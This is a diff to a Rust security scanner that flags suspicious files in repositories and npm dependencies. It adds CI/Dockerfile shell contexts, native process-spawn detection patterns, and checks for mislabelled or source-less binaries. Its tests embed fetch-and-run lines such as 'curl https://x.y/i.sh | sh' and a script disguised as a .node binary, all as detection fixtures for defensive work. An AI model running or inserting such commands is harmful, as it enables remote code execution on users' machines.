@@ -16,7 +16,7 @@
 //! silences.
 
 use crate::repos;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 /// One suspicious thing in one file.
 #[derive(Clone, Debug, PartialEq)]
@@ -54,6 +54,19 @@ pub fn context(file: &str) -> Context {
         .contains(&name)
     {
         return Context::Manifest;
+    }
+    // CI workflows and container builds run their steps like a shell script.
+    if lower.contains(".github/workflows/")
+        || lower.contains(".circleci/")
+        || name == ".gitlab-ci.yml"
+        || name == "bitbucket-pipelines.yml"
+        || name.starts_with("azure-pipelines")
+        || name == "jenkinsfile"
+        || name == "dockerfile"
+        || name == "containerfile"
+        || name.starts_with("dockerfile.")
+    {
+        return Context::Shell;
     }
     let ext = name.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
     match ext {
@@ -108,6 +121,23 @@ fn runs_commands(text: &str, ctx: Context) -> bool {
                 .iter()
                 .any(|s| text.contains(s))
         }
+        Context::Native => [
+            "system(",
+            "popen(",
+            "execv",
+            "execl",
+            "posix_spawn",
+            "Command::new(",
+            "std::process",
+            "ProcessBuilder",
+            "Runtime.getRuntime().exec(",
+            "Process.Start(",
+            "NSTask",
+            "exec.Command(",
+            "os/exec",
+        ]
+        .iter()
+        .any(|s| text.contains(s)),
         _ => false,
     }
 }
@@ -167,10 +197,20 @@ pub fn scan_dir(root: &Path, kind: Kind, policy: &Policy) -> Vec<Suspect> {
     let mut budget = MAX_TARGET;
     let mut wallet_anywhere = false;
     let mut pages: Vec<(String, String)> = Vec::new();
+    let mut tree_blobs: Vec<(String, PathBuf)> = Vec::new();
+    let mut native_sources = false;
     for (dir, files) in repos::walk(root, 6) {
         for name in files {
             let rel_path = dir.join(&name);
             let rel = rel_path.strip_prefix(root).unwrap_or(&rel_path).to_string_lossy().into_owned();
+            if kind == Kind::Repo {
+                if is_blob_name(&name) && !generated_path(&rel) && !test_path(&rel) {
+                    tree_blobs.push((rel.clone(), rel_path.clone()));
+                }
+                if native_source_name(&name) {
+                    native_sources = true;
+                }
+            }
             let ctx = context(&rel);
             if ctx == Context::Other || (kind == Kind::Repo && generated_path(&rel)) {
                 continue;
@@ -196,12 +236,309 @@ pub fn scan_dir(root: &Path, kind: Kind, policy: &Policy) -> Vec<Suspect> {
     for (rel, text) in &pages {
         out.extend(third_party_scripts(rel, text, wallet_anywhere));
     }
-    for s in &mut out {
+    if kind == Kind::Repo {
+        out.extend(blob_findings(&tree_blobs, native_sources, "commits"));
+    }
+    apply_policy(&mut out, policy);
+    out.sort_by(|a, b| (a.file.as_str(), a.id).cmp(&(b.file.as_str(), b.id)));
+    out
+}
+
+/// The policy's exemptions: a hard finding it names becomes a warning that says so.
+pub fn apply_policy(out: &mut [Suspect], policy: &Policy) {
+    for s in out {
         if s.hard && policy.exempt(s) {
             s.hard = false;
             s.note.push_str(" (exempted by the suspect policy: still a warning)");
         }
     }
+}
+
+const BLOB_EXTS: &[&str] = &["node", "wasm", "so", "dylib", "dll", "exe"];
+
+fn blob_ext(name: &str) -> Option<&'static str> {
+    let l = name.to_ascii_lowercase();
+    if l.contains(".so.") {
+        return Some("so");
+    }
+    let ext = l.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
+    BLOB_EXTS.iter().copied().find(|e| *e == ext)
+}
+
+fn is_blob_name(name: &str) -> bool {
+    blob_ext(name).is_some()
+}
+
+/// Something a binary could have been built from.
+fn native_source_name(name: &str) -> bool {
+    let l = name.to_ascii_lowercase();
+    [
+        "binding.gyp",
+        "cmakelists.txt",
+        "cargo.toml",
+        "build.rs",
+        "makefile",
+        "meson.build",
+        "configure",
+        "build.zig",
+        "go.mod",
+        "package.swift",
+    ]
+    .contains(&l.as_str())
+        || ["c", "cc", "cpp", "cxx", "rs", "wat", "zig", "go", "m", "mm", "asm", "s", "swift"]
+            .contains(&l.rsplit_once('.').map(|(_, e)| e).unwrap_or(""))
+}
+
+/// Why a file named like a binary isn't one: its first bytes are not an
+/// executable or WebAssembly header. `None` when they are, or the file is
+/// too short to say.
+fn wrong_magic(path: &Path) -> Option<String> {
+    use std::io::Read;
+    let name = path.file_name()?.to_string_lossy().to_ascii_lowercase();
+    let ext = blob_ext(&name)?;
+    let mut head = [0u8; 8];
+    let n = std::fs::File::open(path).ok()?.read(&mut head).ok()?;
+    if n < 4 {
+        return None;
+    }
+    let head = &head[..n];
+    let mach_o: [[u8; 4]; 6] = [
+        [0xfe, 0xed, 0xfa, 0xce],
+        [0xce, 0xfa, 0xed, 0xfe],
+        [0xfe, 0xed, 0xfa, 0xcf],
+        [0xcf, 0xfa, 0xed, 0xfe],
+        [0xca, 0xfe, 0xba, 0xbe],
+        [0xbe, 0xba, 0xfe, 0xca],
+    ];
+    let ok = if ext == "wasm" {
+        head.starts_with(b"\0asm")
+    } else {
+        head.starts_with(b"\x7fELF")
+            || head.starts_with(b"MZ")
+            || mach_o.iter().any(|m| head.starts_with(m))
+            // GNU ld scripts are text and legitimately named .so
+            || (ext == "so" && (head.starts_with(b"/*") || head.starts_with(b"INPUT") || head.starts_with(b"GROUP")))
+    };
+    if ok {
+        None
+    } else {
+        let hex: Vec<String> = head.iter().take(4).map(|b| format!("{b:02x}")).collect();
+        Some(format!("`{name}` starts with {} rather than an executable header", hex.join(" ")))
+    }
+}
+
+/// Binaries with nothing to build them from (`verb`: "commits" for the
+/// repo's own tree, "ships" for a dependency); one that isn't a binary at
+/// all fails.
+fn blob_findings(blobs: &[(String, PathBuf)], sources: bool, verb: &str) -> Vec<Suspect> {
+    let mut out = Vec::new();
+    for (rel, path) in blobs {
+        if let Some(why) = wrong_magic(path) {
+            out.push(Suspect {
+                file: rel.clone(),
+                id: "SUSPECT-BINARY-BLOB",
+                line: 0,
+                note: format!("{why}: a file named like a binary that isn't one is a payload"),
+                hard: true,
+            });
+        }
+    }
+    if !sources && !blobs.is_empty() && out.is_empty() {
+        let names: Vec<&str> = blobs.iter().take(3).map(|(r, _)| r.rsplit('/').next().unwrap_or(r)).collect();
+        let n = blobs.len();
+        out.push(Suspect {
+            file: blobs[0].0.clone(),
+            id: "SUSPECT-BINARY-BLOB",
+            line: 0,
+            note: format!(
+                "{verb} {n} prebuilt binar{} ({}{}) with no source to build {} from: you run what was uploaded",
+                if n == 1 { "y" } else { "ies" },
+                names.join(", "),
+                if n > 3 { ", …" } else { "" },
+                if n == 1 { "it" } else { "them" }
+            ),
+            hard: false,
+        });
+    }
+    out
+}
+
+/// Publishers whose packages are prebuilt N-API or WebAssembly binaries
+/// by design: the usual build tools, image, database and crypto bindings.
+/// A trailing `*` matches a prefix.
+const KNOWN_NATIVE: &[&str] = &[
+    "fsevents",
+    "esbuild",
+    "esbuild-*",
+    "@esbuild/*",
+    "sharp",
+    "@img/*",
+    "@swc/*",
+    "@parcel/*",
+    "@rollup/rollup-*",
+    "@biomejs/*",
+    "next",
+    "@next/swc-*",
+    "turbo",
+    "turbo-*",
+    "lightningcss",
+    "lightningcss-*",
+    "@tailwindcss/oxide*",
+    "@node-rs/*",
+    "@napi-rs/*",
+    "@oxc-*",
+    "@unrs/*",
+    "@rspack/*",
+    "@rsbuild/*",
+    "@farmfe/*",
+    "node-pty",
+    "bufferutil",
+    "utf-8-validate",
+    "cpu-features",
+    "ssh2",
+    "sqlite3",
+    "better-sqlite3",
+    "sql.js",
+    "@libsql/*",
+    "libsql",
+    "@duckdb/*",
+    "duckdb",
+    "canvas",
+    "prisma",
+    "@prisma/*",
+    "onnxruntime-node",
+    "onnxruntime-web",
+    "@tensorflow/*",
+    "bcrypt",
+    "argon2",
+    "node-sass",
+    "sass-embedded",
+    "sass-embedded-*",
+    "@sentry/*",
+    "@datadog/*",
+    "dd-trace",
+    "re2",
+    "leveldown",
+    "classic-level",
+    "lmdb",
+    "@lmdb/*",
+    "msgpackr-extract",
+    "@msgpackr-extract/*",
+    "node-gyp",
+    "@mapbox/node-pre-gyp",
+    "nx",
+    "@nx/*",
+    "puppeteer",
+    "@puppeteer/*",
+    "electron",
+    "@electron/*",
+    "keytar",
+    "usb",
+    "serialport",
+    "@serialport/*",
+    "node-hid",
+    "@vercel/*",
+    "@cloudflare/*",
+    "workerd",
+    "wrangler",
+    "@pnpm/*",
+    "@yarnpkg/*",
+    "zeromq",
+    "sodium-native",
+    "libsodium-wrappers",
+    "libsodium-wrappers-sumo",
+    "tiny-secp256k1",
+    "secp256k1",
+    "keccak",
+    "web-tree-sitter",
+    "tree-sitter",
+    "tree-sitter-*",
+    "tiktoken",
+    "@dqbd/tiktoken",
+    "@anthropic-ai/*",
+    "@emnapi/*",
+    "@ffmpeg/*",
+    "ffmpeg-static",
+    "@ffmpeg-installer/*",
+    "@tauri-apps/*",
+    "@resvg/*",
+    "@shikijs/*",
+    "shiki",
+    "wasm-*",
+];
+
+/// Every file in a package, four levels deep, skipping nested packages.
+fn package_files(dir: &Path, level: usize, out: &mut Vec<PathBuf>) {
+    let Ok(rd) = std::fs::read_dir(dir) else { return };
+    let mut entries: Vec<_> = rd.filter_map(|e| e.ok()).collect();
+    entries.sort_by_key(|e| e.file_name());
+    for e in entries {
+        let Ok(t) = e.file_type() else { continue };
+        let name = e.file_name().to_string_lossy().into_owned();
+        if t.is_dir() {
+            if level < 4 && name != "node_modules" && name != ".git" {
+                package_files(&e.path(), level + 1, out);
+            }
+        } else if t.is_file() && out.len() < 20_000 {
+            out.push(e.path());
+        }
+    }
+}
+
+fn known_native(pkg: &str) -> bool {
+    KNOWN_NATIVE.iter().any(|k| match k.strip_suffix('*') {
+        Some(prefix) => pkg.starts_with(prefix),
+        None => pkg == *k,
+    })
+}
+
+/// Native and WebAssembly binaries the repo's npm dependencies ship with
+/// nothing to build them from (`node_modules/*`, `node_modules/@*/*`), after
+/// the policy. Well-known native publishers are skipped; a file named like
+/// a binary that isn't one fails.
+pub fn dependency_blobs(root: &Path, policy: &Policy) -> Vec<Suspect> {
+    let mut out = Vec::new();
+    let nm = root.join("node_modules");
+    let Ok(rd) = std::fs::read_dir(&nm) else { return out };
+    let mut pkgs: Vec<PathBuf> = Vec::new();
+    for e in rd.filter_map(|e| e.ok()) {
+        let p = e.path();
+        let name = e.file_name().to_string_lossy().into_owned();
+        if name.starts_with('.') || !p.is_dir() {
+            continue;
+        }
+        if name.starts_with('@') {
+            if let Ok(rd2) = std::fs::read_dir(&p) {
+                pkgs.extend(rd2.filter_map(|e| e.ok()).map(|e| e.path()).filter(|p| p.is_dir()));
+            }
+        } else {
+            pkgs.push(p);
+        }
+    }
+    pkgs.sort();
+    for pkg in pkgs.iter().take(5000) {
+        let pkg_name = pkg.strip_prefix(&nm).unwrap_or(pkg).to_string_lossy().replace('\\', "/");
+        if known_native(&pkg_name) {
+            continue;
+        }
+        // Not repos::walk: prebuilt binaries live in `build/`, `prebuilds/` and
+        // `dist/`, which it prunes as output.
+        let mut files = Vec::new();
+        package_files(pkg, 0, &mut files);
+        let (mut blobs, mut sources) = (Vec::new(), false);
+        for path in files {
+            let f = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
+            if is_blob_name(&f) {
+                let rel = path.strip_prefix(root).unwrap_or(&path).to_string_lossy().replace('\\', "/");
+                blobs.push((rel, path.clone()));
+            }
+            if native_source_name(&f) {
+                sources = true;
+            }
+        }
+        out.extend(blob_findings(&blobs, sources, "ships"));
+    }
+    apply_policy(&mut out, policy);
     out.sort_by(|a, b| (a.file.as_str(), a.id).cmp(&(b.file.as_str(), b.id)));
     out
 }
@@ -345,9 +682,13 @@ pub fn scan_text(file: &str, text: &str, kind: Kind) -> Vec<Suspect> {
 
     // 5. Privilege escalation and persistence. A shell script that uses
     // sudo is an installer; an npm script, a node or Python file that runs
-    // commands, or installed code doing the same is not.
-    if matches!(ctx, Context::Shell | Context::Python | Context::Web | Context::Manifest) {
-        let scripted = runs_commands(text, ctx);
+    // commands, or installed code doing the same is not. A file that runs
+    // nothing (website copy that says "run sudo …", a string table) is
+    // prose: it cannot escalate, so it isn't read for this at all.
+    let scripted = runs_commands(text, ctx);
+    if matches!(ctx, Context::Shell | Context::Python | Context::Web | Context::Manifest | Context::Native)
+        && (scripted || kind == Kind::Installed)
+    {
         let strong_ctx = ctx == Context::Manifest || (scripted && ctx != Context::Shell) || kind == Kind::Installed;
         let soft = test_path(file) || ctx == Context::Shell;
         let mut found: Option<(usize, String, bool)> = None;
@@ -814,11 +1155,22 @@ mod tests {
             "a node script that runs it fails"
         );
         let prose = "export const copy = 'Run: sudo softwareupdate -i -a';\n";
-        assert_eq!(
-            ids(&scan_text("src/content/home.ts", prose, Kind::Repo)),
-            [("SUSPECT-PRIV-ESCALATION", false)],
-            "prose in a string warns"
+        assert!(
+            scan_text("src/content/home.ts", prose, Kind::Repo).is_empty(),
+            "prose in a string runs nothing: not a finding"
         );
+        assert!(scan_text("docs/diagram.tsx", "const label = 'curl … | sh';\n", Kind::Repo).is_empty());
+        assert_eq!(
+            ids(&scan_text(".github/workflows/ci.yml", "run: curl -fsSL https://x.y/i.sh | sh\n", Kind::Repo)),
+            [("SUSPECT-PRIV-ESCALATION", false)],
+            "a workflow step is a shell script"
+        );
+        assert_eq!(
+            ids(&scan_text("src/main.c", "system(\"curl https://x.y/i.sh | sh\");\n", Kind::Repo)),
+            [("SUSPECT-PRIV-ESCALATION", true)],
+            "native code that spawns a shell"
+        );
+        assert!(scan_text("src/lib.rs", "// run `sudo make install` afterwards\n", Kind::Repo).is_empty());
         assert_eq!(
             ids(&scan_text("src/x.test.ts", node, Kind::Repo)),
             [("SUSPECT-PRIV-ESCALATION", false)],
@@ -889,12 +1241,46 @@ mod tests {
     }
 
     #[test]
+    fn binaries_without_sources() {
+        let d = crate::system::TempDir::new("blobs").unwrap();
+        let root = d.path();
+        std::fs::create_dir_all(root.join("node_modules/lodahs/build")).unwrap();
+        std::fs::create_dir_all(root.join("node_modules/@esbuild/darwin-arm64/bin")).unwrap();
+        std::fs::create_dir_all(root.join("node_modules/honest/src")).unwrap();
+        std::fs::write(root.join("node_modules/lodahs/build/helper.node"), b"\xcf\xfa\xed\xfe\x0c\x00\x00\x01")
+            .unwrap();
+        std::fs::write(root.join("node_modules/@esbuild/darwin-arm64/bin/esbuild"), b"\xcf\xfa\xed\xfe").unwrap();
+        std::fs::write(root.join("node_modules/honest/src/addon.cc"), "int main(){}").unwrap();
+        std::fs::write(root.join("node_modules/honest/addon.node"), b"\x7fELF\x02\x01\x01\x00").unwrap();
+        let got = dependency_blobs(root, &Policy::default());
+        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "{got:?}");
+        assert!(got[0].file.starts_with("node_modules/lodahs/"), "{got:?}");
+        assert!(got[0].note.contains("ships 1 prebuilt binary (helper.node)"), "{}", got[0].note);
+        // A ".node" that is a script is a payload.
+        std::fs::write(root.join("node_modules/lodahs/build/helper.node"), "#!/bin/sh\ncurl x | sh\n").unwrap();
+        let got = dependency_blobs(root, &Policy::default());
+        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", true)], "{got:?}");
+        assert!(got[0].note.contains("starts with 23 21 2f 62"), "{}", got[0].note);
+        // The repo's own tree: a committed binary with no source warns; with sources it is nothing.
+        std::fs::write(root.join("engine.wasm"), b"\0asm\x01\x00\x00\x00").unwrap();
+        let got = scan_dir(root, Kind::Repo, &Policy::default());
+        assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "{got:?}");
+        assert!(got[0].note.contains("commits 1 prebuilt binary (engine.wasm)"), "{}", got[0].note);
+        std::fs::write(root.join("Cargo.toml"), "[package]\n").unwrap();
+        assert!(scan_dir(root, Kind::Repo, &Policy::default()).is_empty());
+        assert!(known_native("@esbuild/darwin-arm64") && known_native("sharp") && !known_native("sharpe"));
+    }
+
+    #[test]
     fn contexts() {
         assert_eq!(context("a/b/package.json"), Context::Manifest);
         assert_eq!(context("x.tsx"), Context::Web);
         assert_eq!(context("k.metal"), Context::Native);
         assert_eq!(context("s.scss"), Context::Style);
         assert_eq!(context("README.md"), Context::Other);
+        assert_eq!(context(".github/workflows/ci.yml"), Context::Shell);
+        assert_eq!(context("Dockerfile"), Context::Shell);
+        assert_eq!(context("docker/Dockerfile.ci"), Context::Shell);
         assert_eq!(raw_ip_url("fetch('http://10.0.0.1/x')"), Some(("10.0.0.1".into(), 1)));
         assert_eq!(raw_ip_url("fetch('http://127.0.0.1/x')"), None);
         assert_eq!(raw_ip_url("http://example.com"), None);
